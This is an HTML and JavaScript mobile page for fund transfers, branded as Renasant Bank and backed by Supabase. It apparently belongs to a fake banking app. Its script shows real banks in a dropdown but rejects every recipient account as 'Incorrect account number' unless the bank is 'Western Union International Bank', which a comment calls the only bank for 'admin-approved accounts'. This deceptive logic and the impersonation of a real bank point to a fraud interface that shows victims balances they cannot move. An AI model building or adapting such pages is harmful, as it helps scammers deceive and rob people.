<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Transfer Funds - Renasant Bank</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script>
    tailwind.config = { theme: { extend: {
      colors: { renasant: { navy: '#062d54', navyDark: '#041f3d', navyGradientStart: '#083a6b', navyGradientEnd: '#042345', greenBg: '#d7ead6', greenText: '#1b5e20', textDark: '#1a2838' } },
      fontFamily: { sans: ['Inter', 'sans-serif'] }
    } } }
  </script>
  <style>
    body { font-family: 'Inter', sans-serif; background-color: #e2e8f0; -webkit-tap-highlight-color: transparent; }
    ::-webkit-scrollbar { width: 0; background: transparent; }
    input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
    input[type=number] { -moz-appearance: textfield; }
  </style>
</head>
<body class="flex justify-center items-center h-[100dvh] overflow-hidden sm:py-4">

  <div class="w-full max-w-[430px] h-[100dvh] sm:h-[min(880px,calc(100dvh-2rem))] bg-white sm:rounded-[40px] shadow-2xl flex flex-col overflow-hidden relative sm:border-[8px] sm:border-slate-800">

    <header class="bg-renasant-navy text-white px-4 py-3.5 flex items-center space-x-3 shadow-md shrink-0">
      <button onclick="goBack()" aria-label="Back" class="text-xl p-1"><i class="fa-solid fa-chevron-left"></i></button>
      <h2 class="text-base font-bold" id="page-title">Transfer Funds</h2>
    </header>

    <!-- Loading -->
    <div id="loading" class="flex-1 flex items-center justify-center text-sm text-gray-500">
      <i class="fa-solid fa-circle-notch fa-spin mr-2"></i> Loading your account...
    </div>

    <main id="content" class="hidden flex-1 overflow-y-auto bg-slate-50">

      <!-- STEP 1: details -->
      <section id="step-details" class="p-4 space-y-4">
        <div class="rounded-xl overflow-hidden shadow-md bg-gradient-to-b from-renasant-navyGradientStart to-renasant-navyGradientEnd text-white p-4 flex justify-between items-center">
          <div>
            <div class="text-sm font-semibold" id="from-label">Checking</div>
            <div class="text-[11px] text-gray-300">From account</div>
          </div>
          <div class="text-right">
            <div class="text-2xl" id="from-balance">$0.00</div>
            <div class="text-[11px] text-gray-300">Available balance</div>
          </div>
        </div>

        <div class="bg-white p-4 rounded-xl border space-y-3">
          <div class="space-y-1">
            <label for="to-bank" class="text-xs font-bold text-gray-600">Recipient bank <span id="bank-country" class="font-normal text-gray-500"></span></label>
            <select id="to-bank" onchange="lookupAccount()" class="w-full p-3 bg-white border rounded-lg text-sm font-semibold text-gray-700 focus:outline-renasant-navy">
              <option value="">Select bank</option>
            </select>
          </div>
          <div class="space-y-1">
            <label for="to-account" class="text-xs font-bold text-gray-600">Recipient account number</label>
            <input id="to-account" type="text" inputmode="numeric" maxlength="16" autocomplete="off" placeholder="16-digit account number"
              oninput="this.value=this.value.replace(/\D/g,''); lookupAccount()" class="w-full p-3 border rounded-lg text-sm font-mono font-semibold focus:outline-renasant-navy">
            <div id="lookup" class="hidden text-xs font-semibold rounded-lg px-3 py-2 mt-1 flex items-center space-x-2"></div>
          </div>
          <div class="space-y-1">
            <label for="amount" class="text-xs font-bold text-gray-600">Amount ($)</label>
            <input id="amount" type="number" inputmode="decimal" step="0.01" min="0.01" placeholder="0.00" class="w-full p-3 border rounded-lg text-sm font-bold focus:outline-renasant-navy">
          </div>
          <div class="space-y-1">
            <label for="memo" class="text-xs font-bold text-gray-600">Memo (optional)</label>
            <input id="memo" type="text" maxlength="60" placeholder="What's this for?" class="w-full p-3 border rounded-lg text-sm focus:outline-renasant-navy">
          </div>
          <p id="details-err" class="hidden text-xs text-red-600 font-semibold"></p>
          <button id="continue-btn" onclick="checkRecipient()" disabled class="w-full bg-renasant-navy text-white py-3 rounded-xl font-bold text-sm shadow-md opacity-50">Continue</button>
        </div>

      </section>

      <!-- STEP 2: review + PIN -->
      <section id="step-review" class="hidden p-4 space-y-4">
        <div class="bg-white border rounded-xl divide-y text-sm">
          <div class="flex justify-between p-3"><span class="text-gray-500">From</span><span class="font-semibold" id="r-from"></span></div>
          <div class="flex justify-between p-3"><span class="text-gray-500">Bank</span><span class="font-semibold text-right" id="r-bank"></span></div>
          <div class="flex justify-between p-3"><span class="text-gray-500">To account</span><span class="font-semibold font-mono" id="r-to"></span></div>
          <div class="flex justify-between p-3"><span class="text-gray-500">Recipient</span><span class="font-semibold text-right" id="r-name"></span></div>
          <div class="flex justify-between p-3"><span class="text-gray-500">Memo</span><span class="font-semibold text-right" id="r-memo"></span></div>
          <div class="flex justify-between p-3"><span class="text-gray-500">Amount</span><span class="font-bold text-renasant-navy text-lg" id="r-amount"></span></div>
        </div>

        <div class="bg-white p-4 rounded-xl border space-y-3">
          <div class="text-center space-y-1">
            <div class="w-12 h-12 mx-auto rounded-full bg-blue-50 text-renasant-navy flex items-center justify-center text-xl"><i class="fa-solid fa-lock"></i></div>
            <h3 class="font-bold text-sm text-renasant-textDark">Enter your transaction PIN</h3>
          </div>
          <input id="pin" type="password" inputmode="numeric" maxlength="4" autocomplete="off" placeholder="••••"
            oninput="this.value=this.value.replace(/\D/g,'')" class="w-full p-3 border-2 rounded-xl text-2xl font-bold text-center tracking-[0.6em] focus:outline-renasant-navy">
          <p id="no-pin" class="hidden text-xs text-amber-700 bg-amber-50 border border-amber-200 rounded-lg p-3">
            You haven't set a transaction PIN yet. <a href="renasant-bank.html" class="underline font-bold">Open Profile</a> to set one, then come back.
          </p>
          <p id="review-err" class="hidden text-xs text-red-600 font-semibold text-center"></p>
          <button id="confirm-btn" onclick="submitTransfer()" class="w-full bg-renasant-navy text-white py-3 rounded-xl font-bold text-sm shadow-md">Confirm Transfer</button>
          <button onclick="showStep('details')" class="w-full text-renasant-navy py-2 text-xs font-bold">Edit details</button>
        </div>
      </section>

      <!-- STEP 3: success -->
      <section id="step-done" class="hidden p-6 text-center space-y-5 pt-12">
        <div class="w-20 h-20 mx-auto rounded-full bg-renasant-greenBg text-renasant-greenText flex items-center justify-center text-4xl"><i class="fa-solid fa-check"></i></div>
        <div class="space-y-1">
          <h3 class="font-bold text-xl text-renasant-textDark">Transfer complete</h3>
          <p class="text-sm text-gray-600" id="done-text"></p>
        </div>
        <div class="bg-white border rounded-xl p-4 text-sm flex justify-between">
          <span class="text-gray-500">New available balance</span><span class="font-bold text-renasant-navy" id="done-balance"></span>
        </div>
        <button onclick="goBack()" class="w-full bg-renasant-navy text-white py-3 rounded-xl font-bold text-sm shadow-md">Back to Home</button>
        <button onclick="resetForm()" class="w-full text-renasant-navy py-2 text-xs font-bold">Make another transfer</button>
      </section>
    </main>
  </div>

<script>
  const SUPABASE_URL = 'https://tuuxyvxufxbyeeyrgebj.supabase.co';
  const SUPABASE_ANON_KEY = 'sb_publishable_73R5E7vPBpMAU1gPo65zpQ_ejMCBDQv';
  const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
  const HOME = 'renasant-bank.html';
  const WU = 'Western Union International Bank';   // the only bank that accepts admin-approved accounts
  const BANKS = {
    'United States': ['Bank of America','Chase','Wells Fargo','Citibank','U.S. Bank'],
    'Canada': ['Royal Bank of Canada','TD Canada Trust','Scotiabank','BMO','CIBC'],
    'Mexico': ['BBVA México','Banorte','Santander México','Citibanamex'],
    'United Kingdom': ['Barclays','HSBC UK','Lloyds Bank','NatWest','Santander UK'],
    'Ireland': ['AIB','Bank of Ireland','Permanent TSB'],
    'France': ['BNP Paribas','Crédit Agricole','Société Générale','LCL'],
    'Germany': ['Deutsche Bank','Commerzbank','DKB','Sparkasse'],
    'Spain': ['Santander','BBVA','CaixaBank','Banco Sabadell'],
    'Italy': ['Intesa Sanpaolo','UniCredit','Banco BPM','Monte dei Paschi'],
    'Portugal': ['Caixa Geral de Depósitos','Millennium bcp','Novo Banco','Santander Portugal'],
    'Netherlands': ['ING','Rabobank','ABN AMRO','bunq'],
    'Belgium': ['KBC','BNP Paribas Fortis','Belfius','ING Belgium'],
    'Switzerland': ['UBS','Credit Suisse','PostFinance','Zürcher Kantonalbank'],
    'Sweden': ['Swedbank','SEB','Handelsbanken','Nordea'],
    'Norway': ['DNB','Nordea Norway','SpareBank 1'],
    'Denmark': ['Danske Bank','Nordea Denmark','Jyske Bank'],
    'Finland': ['Nordea Finland','OP Financial Group','Danske Bank Finland'],
    'Poland': ['PKO Bank Polski','Bank Pekao','mBank','ING Bank Śląski'],
    'Greece': ['National Bank of Greece','Piraeus Bank','Alpha Bank','Eurobank'],
    'Turkey': ['Ziraat Bankası','İş Bankası','Garanti BBVA','Akbank'],
    'Israel': ['Bank Hapoalim','Bank Leumi','Discount Bank','Mizrahi Tefahot'],
    'United Arab Emirates': ['Emirates NBD','First Abu Dhabi Bank','Abu Dhabi Commercial Bank','Mashreq'],
    'Saudi Arabia': ['Al Rajhi Bank','Saudi National Bank','Riyad Bank','Banque Saudi Fransi'],
    'Egypt': ['National Bank of Egypt','Banque Misr','CIB Egypt'],
    'Nigeria': ['Access Bank','GTBank','Zenith Bank','First Bank of Nigeria','UBA'],
    'Ghana': ['GCB Bank','Ecobank Ghana','Stanbic Bank Ghana','Absa Ghana'],
    'Kenya': ['KCB','Equity Bank','Co-operative Bank of Kenya','Absa Kenya'],
    'South Africa': ['Standard Bank','FNB','Absa','Nedbank','Capitec'],
    'India': ['State Bank of India','HDFC Bank','ICICI Bank','Axis Bank'],
    'Pakistan': ['HBL','UBL','MCB Bank','Meezan Bank'],
    'Bangladesh': ['Dutch-Bangla Bank','BRAC Bank','Islami Bank Bangladesh','City Bank'],
    'China': ['ICBC','China Construction Bank','Bank of China','Agricultural Bank of China'],
    'Japan': ['MUFG Bank','Mizuho Bank','SMBC','Resona Bank'],
    'South Korea': ['KB Kookmin Bank','Shinhan Bank','Hana Bank','Woori Bank'],
    'Philippines': ['BDO','BPI','Metrobank','Landbank'],
    'Vietnam': ['Vietcombank','BIDV','VietinBank','Techcombank'],
    'Thailand': ['Bangkok Bank','Kasikornbank','Siam Commercial Bank','Krungthai Bank'],
    'Indonesia': ['Bank Mandiri','BCA','BRI','BNI'],
    'Malaysia': ['Maybank','CIMB','Public Bank','RHB Bank'],
    'Singapore': ['DBS','OCBC','UOB','Standard Chartered Singapore'],
    'Australia': ['Commonwealth Bank','Westpac','ANZ','NAB'],
    'New Zealand': ['ANZ New Zealand','ASB Bank','BNZ','Westpac New Zealand'],
    'Brazil': ['Itaú Unibanco','Banco do Brasil','Bradesco','Caixa Econômica Federal'],
    'Argentina': ['Banco Nación','Banco Galicia','Santander Argentina','BBVA Argentina'],
    'Chile': ['Banco de Chile','BancoEstado','Santander Chile','BCI'],
    'Colombia': ['Bancolombia','Davivienda','Banco de Bogotá','BBVA Colombia'],
    'Peru': ['BCP','BBVA Perú','Interbank','Scotiabank Perú'],
    'Jamaica': ['NCB','Scotiabank Jamaica','JN Bank','Sagicor Bank'],
    'Dominican Republic': ['Banco Popular Dominicano','Banreservas','BHD','Scotiabank DR']
  };
  const DEFAULT_BANKS = ['HSBC','Citibank','Standard Chartered','Santander'];
  const $ = id => document.getElementById(id);
  const money = v => (v < 0 ? '-$' : '$') + Math.abs(v).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

  let me = null;            // { id, balance, account }
  let pending = null;       // { account, amount, memo, name }
  let busy = false;

  function goBack() { window.location.href = HOME; }

  function showStep(s) {
    ['details', 'review', 'done'].forEach(n => $('step-' + n).classList.toggle('hidden', n !== s));
    $('page-title').textContent = s === 'done' ? 'Transfer Complete' : s === 'review' ? 'Review Transfer' : 'Transfer Funds';
    $('content').scrollTop = 0;
  }
  function setErr(id, msg) { const el = $(id); el.textContent = msg || ''; el.classList.toggle('hidden', !msg); }
  function setBusy(btn, on, label) {
    busy = on; btn.disabled = on;
    btn.classList.toggle('opacity-60', on);
    btn.textContent = on ? 'Please wait...' : label;
  }

  async function init() {
    const { data: s } = await sb.auth.getSession();
    if (!s.session) { goBack(); return; }
    const uid = s.session.user.id;
    const { data: p } = await sb.from('profiles').select('balance, account_number, country').eq('id', uid).maybeSingle();
    me = { id: uid, balance: Number(p && p.balance || 0), account: (p && p.account_number) || '', country: (p && p.country) || '' };
    populateBanks();
    renderFrom();
    let hasPin = false;
    try { const { data } = await sb.rpc('has_pin'); hasPin = !!data; } catch (e) {}
    $('no-pin').classList.toggle('hidden', hasPin);
    $('confirm-btn').disabled = !hasPin;
    $('confirm-btn').classList.toggle('opacity-60', !hasPin);
    $('loading').classList.add('hidden');
    $('content').classList.remove('hidden');
  }

  function populateBanks() {
    const list = [WU, ...(BANKS[me.country] || DEFAULT_BANKS)];
    const sel = $('to-bank');
    list.forEach(b => { const o = document.createElement('option'); o.value = b; o.textContent = b; sel.appendChild(o); });
    $('bank-country').textContent = me.country ? '(' + me.country + ')' : '';
  }

  function renderFrom() {
    const last4 = me.account ? ' (****' + me.account.slice(-4) + ')' : '';
    $('from-label').textContent = 'Checking' + last4;
    $('from-balance').textContent = money(me.balance);
  }

  // Live lookup: runs as the account number is typed
  let lookupTimer = null, lookupSeq = 0, verified = null; // verified = { account, name }

  function setLookup(kind, text) {
    const el = $('lookup');
    if (!kind) { el.classList.add('hidden'); return; }
    const styles = {
      ok:   'bg-green-50 text-green-800 border border-green-200',
      bad:  'bg-red-50 text-red-700 border border-red-200',
      wait: 'bg-gray-100 text-gray-600'
    };
    const icons = { ok: 'fa-circle-check', bad: 'fa-circle-xmark', wait: 'fa-circle-notch fa-spin' };
    el.className = 'flex items-center space-x-2 text-xs font-semibold rounded-lg px-3 py-2 mt-1 ' + styles[kind];
    el.innerHTML = '<i class="fa-solid ' + icons[kind] + '"></i><span></span>';
    el.lastChild.textContent = text;
  }
  function setContinue(on) {
    const b = $('continue-btn');
    b.disabled = !on;
    b.classList.toggle('opacity-50', !on);
  }

  function lookupAccount() {
    clearTimeout(lookupTimer);
    verified = null; setContinue(false); setErr('details-err', '');
    const account = $('to-account').value.trim();
    const bank = $('to-bank').value;
    const seq = ++lookupSeq;
    if (account.length < 16) { setLookup(null); return; }      // only check once all 16 digits are in
    if (!bank) { setLookup('bad', 'Select a bank first'); return; }
    if (bank !== WU) { setLookup('bad', 'Incorrect account number'); return; }
    setLookup('wait', 'Checking account...');
    lookupTimer = setTimeout(async () => {
      const { data, error } = await sb.rpc('verify_transfer_account', { p_account: account, p_bank: bank });
      if (seq !== lookupSeq) return;
      if (error) { setLookup('bad', 'Could not check the account. Try again.'); return; }
      if (data === null || data === undefined) { setLookup('bad', 'No account found'); return; }
      verified = { account, bank, name: data || 'Approved account' };
      setLookup('ok', verified.name);
      setContinue(true);
    }, 300);
  }

  // Step 1 -> 2 (the server re-checks everything again on submit)
  function checkRecipient() {
    if (busy) return;
    setErr('details-err', '');
    const account = $('to-account').value.trim();
    const amount = Math.round(parseFloat($('amount').value) * 100) / 100;
    const memo = $('memo').value.trim();

    if (!/^\d{16}$/.test(account)) return setErr('details-err', 'Account number must be 16 digits.');
    if (!verified || verified.account !== account || verified.bank !== $('to-bank').value) return setErr('details-err', 'Incorrect account number.');
    if (!amount || amount <= 0) return setErr('details-err', 'Enter a valid amount.');
    if (amount > me.balance) return setErr('details-err', 'Insufficient funds.');
    if (account === me.account) return setErr('details-err', 'You cannot transfer to the same account.');

    pending = { account, amount, memo, name: verified.name, bank: verified.bank };
    $('r-bank').textContent = pending.bank;
    $('r-from').textContent = $('from-label').textContent;
    $('r-to').textContent = '****' + account.slice(-4);
    $('r-name').textContent = pending.name;
    $('r-memo').textContent = memo || '—';
    $('r-amount').textContent = money(amount);
    $('pin').value = ''; setErr('review-err', '');
    showStep('review');
    $('pin').focus();
  }

  // Step 2 -> 3: PIN, approved-account check and balance are all enforced again server-side
  async function submitTransfer() {
    if (busy || !pending) return;
    setErr('review-err', '');
    const pin = $('pin').value;
    if (!/^\d{4}$/.test(pin)) return setErr('review-err', 'Enter your 4-digit PIN.');

    const btn = $('confirm-btn');
    setBusy(btn, true, 'Confirm Transfer');
    const { data, error } = await sb.rpc('transfer_to_account', {
      p_account: pending.account, p_bank: pending.bank, p_amount: pending.amount, p_pin: pin, p_memo: pending.memo || null
    });
    setBusy(btn, false, 'Confirm Transfer');

    if (error) {
      const m = error.message || '';
      $('pin').value = '';
      if (/not_authorized/i.test(m)) { setErr('review-err', 'Transfer rejected: incorrect account number.'); return; }
      if (/bad_pin/i.test(m)) return setErr('review-err', 'Incorrect PIN. Please try again.');
      if (/insufficient/i.test(m)) return setErr('review-err', 'Insufficient funds.');
      if (/same_account/i.test(m)) return setErr('review-err', 'You cannot transfer to the same account.');
      if (/no_pin/i.test(m)) return setErr('review-err', 'Set a transaction PIN in your profile first.');
      return setErr('review-err', 'Transfer failed. Please try again.');
    }

    me.balance = Number(data);
    renderFrom();
    $('done-text').textContent = `${money(pending.amount)} was sent to ${pending.bank}, account ****${pending.account.slice(-4)}.`;
    $('done-balance').textContent = money(me.balance);
    showStep('done');
  }

  function resetForm() {
    pending = null; verified = null; setLookup(null); setContinue(false);
    ['to-account', 'to-bank', 'amount', 'memo', 'pin'].forEach(id => $(id).value = '');
    setErr('details-err', ''); setErr('review-err', '');
    showStep('details');
  }

  init();
</script>
</body>
</html>
